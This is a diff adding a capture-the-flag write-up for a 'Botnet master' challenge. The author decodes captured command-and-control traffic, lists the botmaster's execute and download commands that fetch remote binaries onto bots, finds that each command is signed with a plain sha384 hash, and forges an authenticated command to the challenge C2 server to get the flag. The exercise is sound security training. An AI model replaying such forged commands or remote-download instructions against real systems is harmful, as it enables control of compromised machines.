@@ -12,7 +12,7 @@ https://www.thecatch.cz/
 	- [`FLAG{XRC9-XyEE-tlTV-nOl7}` Attachment analysis](#attachment-analysis)
 	- [`FLAG{l03Y-BDjA-uB5v-PHVB}` Downloaded File](#downloaded-file)
 	- [`FLAG{kT0c-WTfc-S326-Jp1A}` The Connection](#the-connection)
-	- [Botnet master](#botnet-master)
+	- [`FLAG{uLHI-3Zq1-kOHx-FGR1}` Botnet master](#botnet-master)
 	- [Ransomware](#ransomware)
 - [`FLAG{aKAL-qQhH-MsAz-miUG}` Epilogue](#epilogue)
 
@@ -352,6 +352,57 @@ The flag is hidden in this url [`http://challenges.thecatch.cz:20102/ransomvid19
 > Our network analytics report that one of currently online C2 servers can be found on IP `78.128.216.92` on `TCP/20220`.
 >
 > Good luck!
+
+The goal of this challenge is to mimic botmaster and therefore to be able to send some commands to the cnc server. Messages in the pcap file are encdoded in the same fashion like in the previous challenge [The Connection](#the-connection) but in both directions. We can identify botmaster after decoding all messages, it uses id `kl5puyj43brf7iso` and here is list of all commands and responses he sent:
+```
+kl5puyj43brf7iso;;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6
+command accepted;;
+--
+kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
+command accepted;;
+--
+kl5puyj43brf7iso;;info;;203.0.113.16.20202;;clients;;c3c832bc83fa5d291559487932c5f57d35e838dfe9ec385b49dd45e0a28095738012082401d8b35e55411a25a1acfb96
+ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
+--
+kl5puyj43brf7iso;;wait;;0hpxc5sdo9kgne64;;30;;b7894e9dfb8e92c804fd463d0f3fc1d674a448291a8f049a40a2bed111a0a32d5f257c255fcb645cbd553a6e7debf4c3
+command accepted;;
+--
+kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
+ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
+--
+kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/flag;;http://198.19.220.13:80/flag;;cfb8ad2096b87f07ef3154e198862bab81bce63cba14fd1ecd01ac83c849a42df494dd3b64793f4fad8cc02aa21ec61e
+command accepted;;
+--
+kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/e53;;http://198.19.220.13:80/e53;;6d855614bc506728ec6015b27d1f195307bf20874896f23c5b3b7fe22005d74eb82d4740209b1be17e2de0ff3d5055f1
+command accepted;;
+--
+kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
+ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
+--
+kl5puyj43brf7iso;;download;;*;;/tmp/key;;http://198.19.220.13:80/key;;17dfdf78c676a747ed0640f6b01b1693ccb1bf0ad915ac9b04e2fdace5e109402f67cd7499b028216a07c2c839d4f5fd
+command accepted;;
+--
+kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
+command accepted;;
+--
+kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
+ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
+--
+kl5puyj43brf7iso;;wait;;*;;5;;944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb
+command accepted;;
+```
+The main difference with bot messages is that every command is appended with hash. The hash is 96 characters long hex string, representing 384 bits wide hash. `sha384` seems to be the best candidate. Let's try it
+```
+echo -n 'kl5puyj43brf7iso;;wait;;*;;5' | sha384sum
+944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb  -
+```
+Now we have to send right command `;;info;;78.128.216.92.20220;;clients` (complete script is [here](botnet_master/solve.py))
+```
+('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;clients')
+kl5puyj43brf7iso;;info;;78.128.216.92.20220;;clients;;b9817f590c8d6b39ea92740ccd2790ab568a1880670780dbcde7ab3f8d1a7f80c2e131a96553583f9b6691f981620870
+('0000000000000000', 'szqv0k7i3wc4x28p,hrf83ywuxan6g710,49vwpbry1gl2m0x6,gziok2nlvshjt40q,1wygo68xifsnmp25,7xdjquo5hnysgtc2,thbp8wzj0am2nfkv,xtyzo67pblm5uk8a,ygs13n0ewkrmi92q,6cq2so4ki9geauw7,kt4q0wyouxsnv5zl,4ymensulvr0cw6ka,w2vbckh9x743q1m8,bcsyzftgv47108kj,0ze5pi6d2tgs7b9a,2ycu6w3ao5xk81mj,w9bpa8crlz35etn1,yqsw1id625hbnkog,wusy3k5a9q8pjlve,2sk6glfv57n8dti3,y4v60brqixkeg7ow,ko3jw8ta2d69s41l,4ytocqf38bzjhv1x,ytbvpxwu5ealzk7i,32vo84d65u17tkfp,fvpz3noikus8qycb,3wpn8szkor64u5yb,v67drax459gphs1e,s15aeq0pn2g3j6xh,b4rdsgt1n3woceuf,2a3kqfn9lx4z6jmg,pys2iobz0gf516nj,685tohls30mjd2af,zmh5kebpnao986xd,h0a6igwbyl2xstne,f076a8u9ign1wm3c,69a54ef1cgotuxwn,rswg76vyoqkdj0im,7a1oh5ivrye82slk,z3awgmjexqdnf0hi,glomn4fzk5w03ryq,ik8704gdjms6etxp,he4itz5dn8jfr2p1,zus4qoa2m1ckxlhy,6cfod9k57am4b1h8,9qjmoxezpcrywb16,7fdeg9wxnhzbs86a,elku3brh1ja0d2vn,ne9q7xj8al02zk1g,rofqnxa7kjc480ht,kfq2bd3xj9ymc4uh,9sjo4dh0gtmyv3zp,sub4zp13nhltgc2j,i5vbwh2k6oalex19,8vbyhngx9d063z2f,07utr6cpwijysado,hi5v7mqwd1gn3axy,0wseyjtol8r7c51n,dmtz14qb5owl82nf,59u4zxto6aws8bi2,68hg0tyc52aw1bdi,2lvsmc5uh78k3gp4,ucto0kifh8ewndpj,x0turbs4k32jn9e7,i5afnw8oueh96xvb,6liy7mdwkav20fjs,kbzens1rafxh2p0o,wueb51xyvczqk9if,5wylkjv1n3tp8srz,0gdi4n6a5yoz3fs7,x452baflo3dkhe9p,4zvyrne0lk6us8b3,2cyrtjli98o0vh1a,saf5gn87uimw4vdz,gd9oa2ypnhmx7cqi,p6twq1rc0lm9bhv4,xea2d0wcynbl716z,0y8ec1jtbsonx76q,b7nfcwgsadq35uli,ykso4ug2enidz9r7,o1y4uif6x3petqr9,vp6aw5cbzir9hy2e,nu4xckep05v3ihaf,bszxunhd3wvc52o9,0e9mzviqfrltuaxw,sump87hkwe1d2b4x,fmt8rzy62qwk34uj,ivfc2lqzjm5aoxuk,lt0szb4uvgkwnxq1,v4ahui3y8kjnoq91,yjgsokt38iqcla1e,vcxr4keh5onyl2t6,pewgkbru8563oht0,jm5fv9xuctizwpdl,etkvyilf6oads7p8,04f1qpjmk5h8av9r,FLAG{uLHI-3Zq1-kOHx-FGR1},8jv5c2fet06yk9mg,o91v7bct8zpq045l,8a6gcvhxtlk2z40i,47ke3rfyd15mhiwu,a0wdcnk6l1y5gpz9,gqr2hz7bwliea4nc,2oa8vuxitp6mqzcl,mby4eju2i8dp6lxo,4o75zxhn0ilwpbjt,6iow2fjny0d8uc5z,jlwp5avhsy2ufok9,j2owabrvkln4me97,2bh8dnlv6k4ypt01,pvwahzkj8153g6b7,f03xc1lgmuqz5jhe,zg9qjpdi4l86sce2,6jbnr89fw05lpcq4,req18kvgfoc5yb6l,1x62cjq0znsfi9lv,g6r1xzc78ipjunmo,yujgbkpcsdv65r3q,rphsuicqa6gyoxvt,gsdt3mc2vw1ai6pf,clgjkd2534a8qns9,1ib4wpqmfexk68o5,3rnt5lok4qyzgp62,bxm2yugh34vez5qr,cldf89oenwpvy40m,w1059nsqv4otakmy,2baw3ptkvfeinucy,adkny13cxew2f64t')
+```
+Well, the flag is nicely hidden in between other clients. It really took me while to notice it and at the end it took me longer than necessary to solve this challenge. And the lesson learned? Search the `FLAG{` pattern everywhere. It is just simple `grep` :S
 
 ### Ransomware
 
